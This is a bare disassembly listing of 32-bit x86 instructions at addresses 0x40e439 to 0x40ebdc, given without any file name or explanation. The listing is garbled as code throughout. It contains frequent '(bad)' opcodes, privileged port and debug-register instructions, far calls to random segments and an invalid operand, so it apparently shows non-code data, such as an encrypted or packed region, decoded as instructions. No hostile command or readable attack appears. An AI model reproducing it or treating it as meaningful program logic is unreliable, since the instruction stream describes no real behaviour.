  40e439:	xchg   ebx,eax
  40e43a:	mov    eax,ds:0x5b9104eb
  40e43f:	imul   ebp,DWORD PTR ds:0x95df6c0,0x60491d20
  40e449:	xchg   ebp,eax
  40e44a:	cmp    eax,0xb32a3572
  40e44f:	in     eax,0xed
  40e451:	push   ebp
  40e452:	loop   0x40e454
  40e454:	rol    edx,1
  40e456:	(bad)  
  40e457:	push   eax
  40e458:	lods   eax,DWORD PTR ds:[esi]
  40e459:	xor    eax,0x74a5aef0
  40e45e:	(bad)  
  40e45f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e460:	fiadd  DWORD PTR [ecx-0x272796b4]
  40e466:	stc    
  40e467:	aad    0x64
  40e469:	adc    BYTE PTR [eax+0x21],0x42
  40e46d:	xchg   ebx,eax
  40e46e:	or     ebx,DWORD PTR [esi]
  40e470:	fisubr DWORD PTR [edi+ebp*2]
  40e473:	test   DWORD PTR [edx+0x78],0xa43e9879
  40e47a:	lock jno 0x40e42a
  40e47d:	popa   
  40e47e:	scas   al,BYTE PTR es:[edi]
  40e47f:	mov    dh,0x47
  40e481:	popa   
  40e482:	mov    esi,0xacc85feb
  40e487:	fistp  QWORD PTR [ebx+0x4e]
  40e48a:	fstp   TBYTE PTR [eax-0x5d]
  40e48d:	or     eax,0x2805bca7
  40e492:	cmp    BYTE PTR [eax-0x3],cl
  40e495:	cdq    
  40e496:	popa   
  40e497:	cld    
  40e498:	sbb    ecx,DWORD PTR [esi]
  40e49a:	sti    
  40e49b:	test   al,0xb3
  40e49d:	ret    0x5e0d
  40e4a0:	jg     0x40e42d
  40e4a2:	push   ecx
  40e4a3:	(bad)  
  40e4a4:	cmp    eax,0xd9a8c4d0
  40e4a9:	int3   
  40e4aa:	xchg   esi,eax
  40e4ab:	cmp    BYTE PTR [ebp+0x6f547b2d],dh
  40e4b1:	int3   
  40e4b2:	sbb    bh,ah
  40e4b4:	in     eax,dx
  40e4b5:	arpl   WORD PTR [esi],sp
  40e4b7:	pop    ss
  40e4b8:	int3   
  40e4b9:	jmp    0xc3d3ef48
  40e4be:	jae    0x40e444
  40e4c0:	xchg   ecx,eax
  40e4c1:	icebp  
  40e4c2:	rcl    DWORD PTR ds:0x87316c6f,cl
  40e4c8:	push   es
  40e4c9:	dec    edi
  40e4ca:	and    BYTE PTR [ebx+0x17],cl
  40e4cd:	inc    di
  40e4cf:	inc    edx
  40e4d0:	jbe    0x40e4c4
  40e4d2:	and    ch,bl
  40e4d4:	sbb    BYTE PTR [ecx+eax*2+0x11],ah
  40e4d8:	jmp    0x207f3676
  40e4dd:	adc    BYTE PTR ds:0x8a78f21c,0x1b
  40e4e4:	jb     0x40e4cc
  40e4e6:	cmc    
  40e4e7:	xchg   DWORD PTR [edx-0x27929ca5],ecx
  40e4ed:	into   
  40e4ee:	jne    0x40e4e8
  40e4f0:	mov    al,0x1e
  40e4f2:	pop    ebp
  40e4f3:	test   BYTE PTR [edx-0x8],dl
  40e4f6:	inc    ecx
  40e4f7:	fld    TBYTE PTR [edi-0x5d6156f6]
  40e4fd:	retf   0x5564
  40e500:	arpl   WORD PTR [ebx],bp
  40e502:	not    DWORD PTR [edi+edx*4-0x570425e3]
  40e509:	wbinvd 
  40e50b:	mov    cs,ecx
  40e50d:	in     eax,0x22
  40e50f:	in     al,dx
  40e510:	or     ah,BYTE PTR [esi]
  40e512:	mov    db7,esi
  40e515:	(bad)  
  40e517:	test   al,0x22
  40e519:	pusha  
  40e51a:	mov    ds:0xe4c32ea3,al
  40e51f:	repnz fdiv QWORD PTR [ebx+0x476b0041]
  40e526:	adc    eax,0x7d8404eb
  40e52b:	xchg   esp,eax
  40e52c:	jmp    0xee59b69f
  40e531:	in     eax,0xd3
  40e533:	jp     0x40e507
  40e535:	shl    esp,0x87
  40e538:	cmp    esp,0x7413f74b
  40e53e:	scas   eax,DWORD PTR es:[edi]
  40e53f:	dec    ecx
  40e540:	dec    ebx
  40e541:	gs xchg esp,eax
  40e543:	ret    0xe144
  40e546:	pop    ss
  40e547:	sbb    al,0x3
  40e549:	add    DWORD PTR [edx+0x6d],edi
  40e54c:	xchg   esp,eax
  40e54d:	mov    WORD PTR [edi-0x17b29f24],ss
  40e553:	test   DWORD PTR [ebp+0x1a],esp
  40e556:	outs   dx,DWORD PTR ds:[esi]
  40e557:	sub    ah,BYTE PTR [ecx-0x6fabc851]
  40e55d:	jl     0x40e5c9
  40e55f:	cmp    eax,0x462570d5
  40e564:	ret    0x601f
  40e567:	mov    al,ds:0xc6a72651
  40e56c:	mov    esp,0x59b013ab
  40e571:	(bad)  
  40e572:	push   edx
  40e573:	shr    DWORD PTR [ebp-0x4a],0x4a
  40e577:	jb     0x40e55c
  40e579:	(bad)  
  40e57a:	in     al,0xb0
  40e57c:	jecxz  0x40e573
  40e57e:	dec    ecx
  40e57f:	cmp    ah,BYTE PTR [esi]
  40e581:	pop    ecx
  40e582:	push   0x2c2f9f1b
  40e587:	in     al,0x12
  40e589:	cmp    eax,0x7cb7444f
  40e58e:	pop    ecx
  40e58f:	cmp    eax,0xdf7f27d7
  40e594:	mov    ch,0xaf
  40e596:	cmp    eax,0xc54d1496
  40e59b:	xchg   BYTE PTR [ecx-0x1af169b6],dl
  40e5a1:	int    0xc1
  40e5a3:	mov    eax,ds:0x1c0a8c28
  40e5a8:	xchg   esi,eax
  40e5a9:	pop    esi
  40e5aa:	mov    dh,0x3d
  40e5ac:	shl    DWORD PTR [esi+0x25],0xcb
  40e5b0:	or     BYTE PTR [edi],ah
  40e5b2:	js     0x40e578
  40e5b4:	rcl    DWORD PTR [esi+0x11],cl
  40e5b7:	aad    0x27
  40e5b9:	ins    BYTE PTR es:[edi],dx
  40e5ba:	out    0x35,al
  40e5bc:	lods   al,BYTE PTR ds:[esi]
  40e5bd:	frstor ss:[eax+0xf]
  40e5c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5c2:	push   ebp
  40e5c3:	xor    al,cl
  40e5c5:	mov    al,ds:0x230d1816
  40e5ca:	aam    0xb0
  40e5cc:	jo     0x40e5bd
  40e5ce:	or     eax,DWORD PTR [ebx+0x7b]
  40e5d1:	cmp    ch,BYTE PTR [esi]
  40e5d3:	aas    
  40e5d4:	cli    
  40e5d5:	mov    BYTE PTR [esi-0x572131d6],al
  40e5db:	popa   
  40e5dc:	test   DWORD PTR [edx+0x75],edx
  40e5df:	aam    0x2b
  40e5e1:	ror    DWORD PTR [edx],0xf6
  40e5e4:	sbb    DWORD PTR [edx+edi*4-0x3c2053ee],edi
  40e5eb:	pushf  
  40e5ec:	sub    BYTE PTR ds:0x52708b59,bl
  40e5f2:	call   0x6e2e9d5c
  40e5f7:	push   ebx
  40e5f8:	ja     0x40e5cf
  40e5fa:	nop
  40e5fb:	jnp    0x40e63f
  40e5fd:	mov    ebx,0xe76ee7d3
  40e602:	test   eax,0xb33ab0c9
  40e607:	sahf   
  40e608:	retf   0x38da
  40e60b:	sub    eax,0x3d335274
  40e610:	(bad)  [ebp-0x4d]
  40e613:	adc    al,0xdf
  40e615:	ret    
  40e616:	sub    DWORD PTR [edi-0x7749e56],edi
  40e61c:	inc    ebp
  40e61d:	into   
  40e61e:	rol    BYTE PTR ds:0x7eb56560,cl
  40e624:	cwde   
  40e625:	xlat   BYTE PTR ds:[ebx]
  40e626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e627:	ds push ss
  40e629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e62a:	nop
  40e62b:	cli    
  40e62c:	inc    eax
  40e62d:	add    al,0xb2
  40e62f:	cmp    DWORD PTR [edi-0x5b],0x4c
  40e633:	push   esp
  40e634:	xchg   esp,eax
  40e635:	xchg   ebp,eax
  40e636:	jp     0x40e5c3
  40e638:	sbb    BYTE PTR [eax-0x61],cl
  40e63b:	jle    0x40e66c
  40e63d:	pop    esi
  40e63e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e63f:	dec    esi
  40e640:	sub    cl,BYTE PTR [ebp+0x45]
  40e643:	push   esp
  40e644:	pop    ecx
  40e645:	imul   ecx,esp,0xffffff9c
  40e648:	jecxz  0x40e63a
  40e64a:	in     eax,dx
  40e64b:	arpl   sp,bp
  40e64d:	and    eax,0xb387882a
  40e652:	call   0xb4bb:0x2580b8a4
  40e659:	jl     0x40e601
  40e65b:	xor    DWORD PTR [ebp-0x3cd0706d],edx
  40e661:	add    ecx,DWORD PTR [edx+0x5f]
  40e664:	imul   ecx,DWORD PTR [eax],0x8b8c666a
  40e66a:	or     BYTE PTR [esi],bh
  40e66c:	std    
  40e66d:	(bad)  
  40e66e:	fcomp  QWORD PTR [ebx-0x1c39cd1f]
  40e674:	sub    cl,dh
  40e676:	pop    ss
  40e677:	jo     0x40e639
  40e679:	adc    ebx,DWORD PTR [edi+eiz*8-0x4c]
  40e67d:	jl     0x40e614
  40e67f:	jle    0x40e6d4
  40e681:	sbb    al,al
  40e683:	xchg   esi,eax
  40e684:	std    
  40e685:	lds    esi,FWORD PTR [edi-0x29859a82]
  40e68b:	xchg   ebx,eax
  40e68c:	int    0xfb
  40e68e:	sbb    eax,0xfcaba5e8
  40e693:	(bad)  
  40e694:	pop    ds
  40e695:	pop    eax
  40e696:	cwde   
  40e697:	mov    al,ds:0xcca05a6c
  40e69c:	dec    ebx
  40e69d:	popf   
  40e69e:	(bad)  
  40e6a0:	(bad)  
  40e6a1:	cmp    ch,cl
  40e6a3:	stc    
  40e6a4:	sbb    eax,0x647d7269
  40e6a9:	cmp    DWORD PTR [ecx-0x180cf56e],ebp
  40e6af:	(bad)  
  40e6b0:	retf   0x80c0
  40e6b3:	sti    
  40e6b4:	mov    edi,0x6e964486
  40e6b9:	inc    ecx
  40e6ba:	xor    eax,0x670f0a96
  40e6bf:	fwait
  40e6c0:	loopne 0x40e663
  40e6c2:	neg    BYTE PTR [ecx+0x374ab3ad]
  40e6c8:	cmp    dh,bh
  40e6ca:	jo     0x40e6f5
  40e6cc:	and    BYTE PTR [edi+edi*4+0x43c816f],ah
  40e6d3:	dec    esi
  40e6d4:	jbe    0x40e66d
  40e6d6:	pop    eax
  40e6d7:	test   DWORD PTR [bx-0x6],ebx
  40e6db:	pop    ebp
  40e6dc:	fsubr  st(4),st
  40e6de:	retf   
  40e6df:	jl     0x40e719
  40e6e1:	les    edx,FWORD PTR [ecx]
  40e6e3:	fisttp WORD PTR ds:0x5d88329
  40e6e9:	pop    ecx
  40e6ea:	dec    eax
  40e6eb:	mov    edx,edx
  40e6ed:	mov    BYTE PTR [ebp-0x4a4fd095],al
  40e6f3:	cmp    dh,BYTE PTR [edi+ebp*4-0x67]
  40e6f7:	jnp    0x40e74e
  40e6f9:	or     al,0x2c
  40e6fb:	fwait
  40e6fc:	retf   0x360a
  40e6ff:	or     eax,0xd51056df
  40e704:	mov    ebp,0x1536ac30
  40e709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e70a:	mov    eax,ds:0x4016671
  40e70f:	adc    eax,0x7ca8fc69
  40e714:	jb     0x40e779
  40e716:	sub    edi,DWORD PTR [edi-0x3342838c]
  40e71c:	(bad)  
  40e71d:	in     eax,dx
  40e71e:	dec    eax
  40e71f:	cmp    ebx,DWORD PTR [edi+0x29a6232a]
  40e725:	mov    dl,0xc9
  40e727:	or     edi,DWORD PTR [esi]
  40e729:	sahf   
  40e72a:	sbb    dl,BYTE PTR [eax+0x6c]
  40e72d:	pop    es
  40e72e:	xor    bh,BYTE PTR [edi+0x5f]
  40e731:	aam    0x6c
  40e733:	push   ss
  40e734:	jns    0x40e6e9
  40e736:	imul   ebx,DWORD PTR [ebp+0x10cce26a],0xffffff9f
  40e73d:	jne    0x40e796
  40e73f:	xor    DWORD PTR [ebp+0x1e],ecx
  40e742:	cli    
  40e743:	mov    dl,0x70
  40e745:	mov    DWORD PTR [edi+0x2d],edx
  40e748:	addr16 mov al,0xb8
  40e74b:	cmc    
  40e74c:	data16 add ch,BYTE PTR [esp+eax*4-0x3ee3d59c]
  40e754:	lahf   
  40e755:	lods   eax,DWORD PTR ds:[esi]
  40e756:	push   edi
  40e757:	add    edx,DWORD PTR [edi+0x64e042b9]
  40e75d:	mov    esp,0x72a39833
  40e762:	ror    ebp,cl
  40e764:	xchg   ecx,eax
  40e765:	jbe    0x40e6fc
  40e767:	imul   ecx,esp,0xffffffca
  40e76a:	adc    dh,ah
  40e76c:	rcl    DWORD PTR [eax+0x3a],1
  40e76f:	test   BYTE PTR [ecx-0x22],bl
  40e772:	mov    WORD PTR [edi],ds
  40e774:	sbb    al,0x6d
  40e776:	mov    ds:0x9890f2eb,eax
  40e77b:	sub    DWORD PTR [edi],ebx
  40e77d:	mov    esp,0x86597a9d
  40e782:	(bad)  
  40e783:	fld    DWORD PTR [edi+0x2bfc77f9]
  40e789:	imul   DWORD PTR ss:[edx]
  40e78c:	sbb    al,0xf9
  40e78e:	sbb    ecx,DWORD PTR [esp+esi*2]
  40e791:	xchg   al,dh
  40e793:	inc    edi
  40e794:	or     edx,DWORD PTR [ecx+0x34e6a0ce]
  40e79a:	inc    ebp
  40e79b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e79c:	js     0x40e75b
  40e79e:	inc    eax
  40e79f:	jl     0x40e773
  40e7a1:	mov    DWORD PTR [ebp-0x6fcb53dc],ebx
  40e7a7:	mov    edx,0x98b3fd11
  40e7ac:	pushf  
  40e7ad:	test   al,0xba
  40e7af:	imul   esi,DWORD PTR [ebx+0x61],0x716b5c86
  40e7b6:	dec    eax
  40e7b7:	or     esi,DWORD PTR [ecx-0xf]
  40e7ba:	push   es
  40e7bb:	jns    0x40e794
  40e7bd:	mov    ebx,0xb9c3d634
  40e7c2:	sub    eax,0x5831d190
  40e7c7:	daa    
  40e7c8:	adc    DWORD PTR [esi+0x75],edx
  40e7cb:	jmp    0x8e5a:0xca5a67d8
  40e7d2:	sar    DWORD PTR [edi-0x6c414f20],1
  40e7d8:	push   ebp
  40e7d9:	out    0x1b,eax
  40e7db:	sub    eax,0xf9400fb7
  40e7e0:	stos   BYTE PTR es:[edi],al
  40e7e1:	dec    eax
  40e7e2:	mov    ebp,0x6b6495d2
  40e7e7:	nop
  40e7e8:	ds mov al,0x0
  40e7eb:	push   eax
  40e7ec:	mov    bh,BYTE PTR [ecx+0x31]
  40e7ef:	imul   edx,edx,0x76
  40e7f2:	fisubr WORD PTR [eax]
  40e7f4:	cmp    eax,0xcb1ed13b
  40e7f9:	mov    dh,0x67
  40e7fb:	pop    ss
  40e7fc:	cmp    DWORD PTR [edx],0x1985b02a
  40e802:	push   ds
  40e803:	ds cmp eax,0x2900028b
  40e809:	pop    ecx
  40e80a:	les    edi,FWORD PTR [eax+eiz*1+0x51]
  40e80e:	pop    ds
  40e80f:	jp     0x40e81d
  40e811:	mov    esi,ecx
  40e813:	mov    DWORD PTR [ebx-0x4e009b51],0x33dd919
  40e81d:	cmc    
  40e81e:	icebp  
  40e81f:	test   eax,0x3ec6eb9c
  40e824:	fimul  DWORD PTR [edx+0xc]
  40e827:	je     0x40e7b7
  40e829:	je     0x40e7c8
  40e82b:	mov    edx,DWORD PTR [edx+0x78]
  40e82e:	sbb    BYTE PTR [edi-0x37],dl
  40e831:	jle    0x40e865
  40e833:	and    DWORD PTR [ebx],edx
  40e835:	or     al,0x28
  40e837:	call   0x4a15:0x67add27d
  40e83e:	mov    bh,0xa8
  40e840:	fs fwait
  40e842:	jnp    0x40e8bc
  40e844:	imul   eax,DWORD PTR [ebp+0x2d],0xffffffd9
  40e848:	aam    0xbd
  40e84a:	jno    0x40e7fd
  40e84c:	neg    BYTE PTR [ebx+0x629da4e]
  40e852:	(bad)  
  40e853:	pop    edi
  40e854:	push   0x2d
  40e856:	(bad)
  40e859:	aaa    
  40e85a:	xchg   edx,eax
  40e85b:	dec    edx
  40e85c:	dec    ebx
  40e85d:	pop    esp
  40e85e:	rcl    DWORD PTR [ebx],0x85
  40e861:	out    dx,eax
  40e862:	ins    DWORD PTR es:[edi],dx
  40e863:	or     eax,0x46be208f
  40e868:	cwde   
  40e869:	arpl   WORD PTR [edx-0x3af6fc67],dx
  40e86f:	mov    ecx,0x34e7863d
  40e874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e875:	fsubrp st(6),st
  40e877:	mov    bh,0x31
  40e879:	aas    
  40e87a:	ins    BYTE PTR es:[edi],dx
  40e87b:	stos   BYTE PTR es:[edi],al
  40e87c:	and    DWORD PTR ds:0x147d9e2,edx
  40e882:	xor    eax,0x5f4b4c4c
  40e887:	xchg   DWORD PTR [edi-0x410fd2bf],ebx
  40e88d:	xchg   bx,ax
  40e88f:	add    eax,esi
  40e891:	(bad)  
  40e892:	aas    
  40e893:	cwde   
  40e894:	hlt    
  40e895:	mov    eax,0x3ca67afc
  40e89a:	mov    bl,0xe5
  40e89c:	mov    eax,ds:0x5f09b766
  40e8a1:	cmp    eax,0xae95079
  40e8a6:	pop    ebx
  40e8a7:	(bad)  
  40e8a8:	xor    bh,BYTE PTR [ecx+0x67]
  40e8ab:	ret    0xc842
  40e8ae:	dec    esp
  40e8af:	fwait
  40e8b0:	push   ds
  40e8b1:	pop    es
  40e8b2:	push   edi
  40e8b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8b4:	jo     0x40e8c1
  40e8b6:	mov    eax,ds:0x51310ac9
  40e8bb:	into   
  40e8bc:	cmp    al,0x62
  40e8be:	or     eax,0x4743def5
  40e8c3:	mov    DWORD PTR [esi],esp
  40e8c5:	int3   
  40e8c6:	loope  0x40e8f7
  40e8c8:	(bad)  
  40e8c9:	ficomp DWORD PTR [ebx]
  40e8cb:	mov    bh,BYTE PTR [esi-0x3f9313f2]
  40e8d1:	or     al,0x69
  40e8d3:	mov    ebx,0xe8860eb3
  40e8d8:	xor    ebp,ecx
  40e8da:	xor    esi,ecx
  40e8dc:	mov    dh,0x52
  40e8de:	or     al,0xd2
  40e8e0:	shr    BYTE PTR [ebp+0x1c21ece8],1
  40e8e6:	rol    DWORD PTR [eax-0x1e],0x9a
  40e8ea:	imul   esp,DWORD PTR [ebp+0x29],0xbd221e69
  40e8f1:	sub    ecx,DWORD PTR [esi+0x55]
  40e8f4:	mov    ebx,DWORD PTR [eax+0x327d9c6e]
  40e8fa:	out    dx,eax
  40e8fb:	push   edi
  40e8fc:	mov    al,ds:0x2ad8a2ea
  40e901:	in     eax,dx
  40e902:	pop    ecx
  40e903:	lods   eax,DWORD PTR ds:[esi]
  40e904:	repnz mov ecx,eax
  40e907:	lods   eax,DWORD PTR ds:[esi]
  40e908:	cwde   
  40e909:	and    BYTE PTR [edi+0x50],al
  40e90c:	mov    ebp,DWORD PTR [ebx+0x7145fa54]
  40e912:	or     DWORD PTR [ebx+ecx*1],eax
  40e915:	into   
  40e916:	cmp    cl,ch
  40e918:	mov    edi,0xea0ddd0c
  40e91d:	or     dl,BYTE PTR [edx-0x44390e91]
  40e923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e924:	out    0x39,al
  40e926:	push   0xfffffff3
  40e928:	loopne 0x40e988
  40e92a:	jle    0x40e95e
  40e92c:	jno    0x40e8c4
  40e92e:	call   0x5ce38141
  40e933:	mov    al,ds:0x2a1a00e0
  40e938:	lock jnp 0x40e90d
  40e93b:	call   0x7e2:0x1656ebc1
  40e942:	fbld   TBYTE PTR [eax+eiz*4-0x7]
  40e946:	mov    al,0x33
  40e948:	pop    edi
  40e949:	enter  0x4452,0x8d
  40e94d:	jo     0x40e93e
  40e94f:	sub    BYTE PTR [esi+0x36],0x62
  40e953:	push   edi
  40e954:	mov    esi,ds
  40e956:	and    dh,cl
  40e958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e959:	jae    0x40e901
  40e95b:	into   
  40e95c:	and    edx,DWORD PTR [ecx]
  40e95e:	fdivr  DWORD PTR [ecx+esi*8]
  40e962:	push   es
  40e963:	push   ebx
  40e964:	cmp    esp,DWORD PTR [eax+0x6d]
  40e967:	pusha  
  40e968:	pop    edi
  40e969:	inc    esp
  40e96a:	test   esi,ebp
  40e96c:	mov    dl,0xff
  40e96e:	jl     0x40e924
  40e970:	mov    ebx,DWORD PTR [esi+ebx*1]
  40e973:	pusha  
  40e974:	push   cs
  40e975:	pop    es
  40e976:	and    esi,ebp
  40e978:	bound  esp,QWORD PTR [esi-0xaebd69]
  40e97e:	dec    ebp
  40e97f:	pop    es
  40e980:	aad    0x22
  40e982:	inc    ebx
  40e983:	iret   
  40e984:	push   cs
  40e985:	arpl   WORD PTR [eax+0x7cdca1fb],dx
  40e98b:	push   cs
  40e98c:	icebp  
  40e98d:	cdq    
  40e98e:	add    ah,BYTE PTR [edi]
  40e990:	fistp  QWORD PTR [eax]
  40e992:	or     al,0xb7
  40e994:	outs   dx,BYTE PTR ds:[esi]
  40e995:	mov    esi,0x9d2cc001
  40e99a:	and    ecx,ebx
  40e99c:	ss icebp 
  40e99e:	mov    esp,0xca0dd143
  40e9a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a4:	jmp    0x40e95e
  40e9a6:	test   eax,0xa842ba8a
  40e9ab:	sbb    bl,ah
  40e9ad:	sub    ebx,ebp
  40e9af:	pop    edi
  40e9b0:	dec    edx
  40e9b1:	xor    DWORD PTR [edi-0x205d3ec3],0x5022e6ff
  40e9bb:	or     BYTE PTR [edx-0x46987519],ch
  40e9c1:	mov    al,0xd2
  40e9c3:	int3   
  40e9c4:	and    ecx,DWORD PTR [eax+0x7]
  40e9c7:	mov    es,WORD PTR [ebx]
  40e9c9:	and    al,0xdc
  40e9cb:	jge    0x40e967
  40e9cd:	(bad)  
  40e9ce:	arpl   WORD PTR [ecx+ecx*2+0x1d],bp
  40e9d2:	arpl   dx,di
  40e9d4:	cwde   
  40e9d5:	xor    DWORD PTR [ecx+0x76],0xd594f1aa
  40e9dc:	rol    ah,1
  40e9de:	mov    dl,0xff
  40e9e0:	jmp    0x40e9de
  40e9e2:	mov    cl,BYTE PTR [edi]
  40e9e4:	push   DWORD PTR [ebp+0x42e9fa0b]
  40e9ea:	test   bl,bl
  40e9ec:	js     0x40ea32
  40e9ee:	imul   esi,DWORD PTR ds:0x5b20ba00,0x19
  40e9f5:	sbb    DWORD PTR [edi+ebx*8-0x64],0xffffffc9
  40e9fa:	test   DWORD PTR [ebx+edi*4-0x46],ebp
  40e9fe:	inc    eax
  40e9ff:	pop    es
  40ea00:	fst    DWORD PTR [edi]
  40ea02:	imul   edi,DWORD PTR [eax+0x5047d157],0xffffff98
  40ea09:	sbb    al,0xf7
  40ea0b:	out    0x54,eax
  40ea0d:	aas    
  40ea0e:	pop    ecx
  40ea0f:	or     DWORD PTR ds:0x1e5463f7,esi
  40ea15:	mov    BYTE PTR [edi+0x2efbb88c],bh
  40ea1b:	pop    es
  40ea1c:	scas   eax,DWORD PTR es:[edi]
  40ea1d:	fucomip st,st(7)
  40ea1f:	mov    ebp,0xc51c8d19
  40ea24:	pop    edx
  40ea25:	mov    esp,0xe2c71ed8
  40ea2a:	mov    eax,ds:0x767b81a2
  40ea2f:	popf   
  40ea30:	loopne 0x40e9c8
  40ea32:	cmp    eax,0xf2b556b9
  40ea37:	sbb    DWORD PTR [edi],0x4775e25c
  40ea3d:	push   ss
  40ea3e:	sbb    al,0x51
  40ea40:	add    al,0x73
  40ea42:	xor    BYTE PTR [edx],0xde
  40ea45:	stos   BYTE PTR es:[edi],al
  40ea46:	xchg   esi,eax
  40ea47:	je     0x40e9cc
  40ea49:	mov    WORD PTR [ecx+0x3e],es
  40ea4c:	add    ebx,esp
  40ea4e:	fs dec ebp
  40ea50:	push   es
  40ea51:	inc    eax
  40ea52:	imul   ebp,DWORD PTR [edi-0x4b2b6f2f],0x9ddca6a3
  40ea5c:	in     al,0xb6
  40ea5e:	adc    esi,esi
  40ea60:	dec    ebp
  40ea61:	shl    DWORD PTR [ebp+0x3b906432],1
  40ea67:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40ea69:	ja     0x40eace
  40ea6b:	dec    esi
  40ea6c:	push   esi
  40ea6d:	and    ah,dh
  40ea6f:	shl    BYTE PTR [eax-0x1d],1
  40ea72:	leave  
  40ea73:	sub    ah,cl
  40ea75:	stc    
  40ea76:	test   DWORD PTR [ecx],eax
  40ea78:	sar    esi,1
  40ea7a:	pop    edi
  40ea7b:	in     eax,dx
  40ea7c:	test   eax,0x7816679b
  40ea81:	sbb    eax,0x2e8553ca
  40ea86:	add    eax,0xc78c755a
  40ea8b:	adc    edx,ecx
  40ea8d:	ret    0xf711
  40ea90:	rcl    BYTE PTR [ebx+ebp*1],0x7d
  40ea94:	aam    0x28
  40ea96:	lea    esp,[ebp+eiz*4-0x27]
  40ea9a:	cld    
  40ea9b:	outs   dx,DWORD PTR ds:[esi]
  40ea9c:	xlat   BYTE PTR ds:[ebx]
  40ea9d:	jp     0x40ea24
  40ea9f:	inc    eax
  40eaa0:	repz lock push edi
  40eaa3:	pop    esp
  40eaa4:	mov    ds:0x5cfaf87c,al
  40eaa9:	(bad)  
  40eaaa:	sbb    DWORD PTR [ebp+edi*1-0x13543b3b],ebp
  40eab1:	ja     0x40eaff
  40eab3:	(bad)  
  40eab4:	sbb    ch,BYTE PTR [edi-0x5497b645]
  40eaba:	push   ss
  40eabb:	into   
  40eabc:	gs jl  0x40ea7a
  40eabf:	ret    
  40eac0:	mov    ecx,0x5b710b93
  40eac5:	mov    ah,0xd4
  40eac7:	or     ch,BYTE PTR [ecx+0x1a454d20]
  40eacd:	call   0x1692:0xb011160b
  40ead4:	mov    ch,0x80
  40ead6:	jo     0x40ea66
  40ead8:	mov    ebp,0x12328078
  40eadd:	cs pop ds
  40eadf:	cmp    BYTE PTR [ebx+0x24b9aa64],0x6b
  40eae6:	mov    ?,WORD PTR [ebx-0x7ac53fad]
  40eaec:	xchg   esi,eax
  40eaed:	jge    0x40eb3b
  40eaef:	aam    0x51
  40eaf1:	shl    ebx,cl
  40eaf3:	jecxz  0x40eb5c
  40eaf5:	mov    di,0x7966
  40eaf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eafa:	add    ebx,DWORD PTR [ebp+eax*2+0x4f8a0561]
  40eb01:	(bad)  
  40eb02:	jo     0x40eaa4
  40eb04:	sti    
  40eb05:	nop
  40eb06:	mov    ds:0x22c368f2,al
  40eb0b:	push   ds
  40eb0c:	ins    DWORD PTR es:[edi],dx
  40eb0d:	aad    0xc8
  40eb0f:	mov    al,0x96
  40eb11:	loope  0x40eaf6
  40eb13:	test   al,0x4c
  40eb15:	loopne 0x40eb94
  40eb17:	jb     0x40eacc
  40eb19:	and    ch,BYTE PTR [edi]
  40eb1b:	mov    bl,BYTE PTR [ebx]
  40eb1d:	push   cs
  40eb1e:	pop    es
  40eb1f:	jg     0x40eafe
  40eb21:	setae  dl
  40eb24:	daa    
  40eb25:	loop   0x40eb2b
  40eb27:	cmp    al,0xd5
  40eb29:	mov    esp,0x14f93f75
  40eb2e:	stc    
  40eb2f:	(bad)  
  40eb30:	sub    BYTE PTR [ebp-0x64],dh
  40eb33:	sbb    al,BYTE PTR [edi]
  40eb35:	adc    esp,DWORD PTR [edi-0x6d]
  40eb38:	aad    0xa4
  40eb3a:	addr16 xchg ecx,eax
  40eb3c:	cmp    eax,ebp
  40eb3e:	push   edi
  40eb3f:	pop    esi
  40eb40:	fstp   TBYTE PTR [edx+0x7]
  40eb43:	inc    edx
  40eb44:	push   ds
  40eb45:	loope  0x40eb15
  40eb47:	imul   esi,eax,0xfffffff4
  40eb4a:	lock and DWORD PTR [edi],ebx
  40eb4d:	fistp  WORD PTR [esi+0x366b315b]
  40eb53:	sbb    ebp,DWORD PTR [ebx+eax*2+0xc04d186]
  40eb5a:	cmp    eax,0xfe68e2ac
  40eb5f:	call   0xb3c1:0x563787a2
  40eb66:	and    DWORD PTR [edi-0x63bcb182],ebp
  40eb6c:	add    eax,0x639b9724
  40eb71:	or     bl,BYTE PTR [ebx-0x3fac305b]
  40eb77:	push   cs
  40eb78:	adc    dh,BYTE PTR [edi]
  40eb7a:	sub    al,0x77
  40eb7c:	push   cs
  40eb7d:	pop    edi
  40eb7e:	jnp    0x40ebcd
  40eb80:	test   BYTE PTR ds:0x4ced3ec5,ch
  40eb86:	fadd   st,st(7)
  40eb88:	outs   dx,DWORD PTR ds:[esi]
  40eb89:	loopne 0x40ebf2
  40eb8b:	xchg   DWORD PTR [esi],eax
  40eb8d:	pop    es
  40eb8e:	or     dh,BYTE PTR [esi-0x598e4dd4]
  40eb94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb95:	std    
  40eb96:	jno    0x40eb7d
  40eb98:	das    
  40eb99:	pop    esp
  40eb9a:	and    edx,ebx
  40eb9c:	xchg   esp,eax
  40eb9d:	mov    DWORD PTR [eax-0xd48e555],esi
  40eba3:	shr    DWORD PTR [ecx-0x28],0x37
  40eba7:	jae    0x40ec14
  40eba9:	mov    ah,0x94
  40ebab:	fnstenv [eax-0x4dc55e31]
  40ebb1:	mov    esi,0xe26272ea
  40ebb6:	icebp  
  40ebb7:	hlt    
  40ebb8:	daa    
  40ebb9:	pop    eax
  40ebba:	xor    eax,0x22c782
  40ebbf:	and    eax,0x9c20620e
  40ebc4:	scas   al,BYTE PTR es:[di]
  40ebc6:	dec    edx
  40ebc7:	faddp  st(6),st
  40ebc9:	int    0x56
  40ebcb:	sub    BYTE PTR [ebp+0x77acf0b5],ch
  40ebd1:	push   edx
  40ebd2:	pop    esi
  40ebd3:	mov    ah,0xe2
  40ebd5:	call   0x99c3:0x9bb01c47
  40ebdc:	ret    
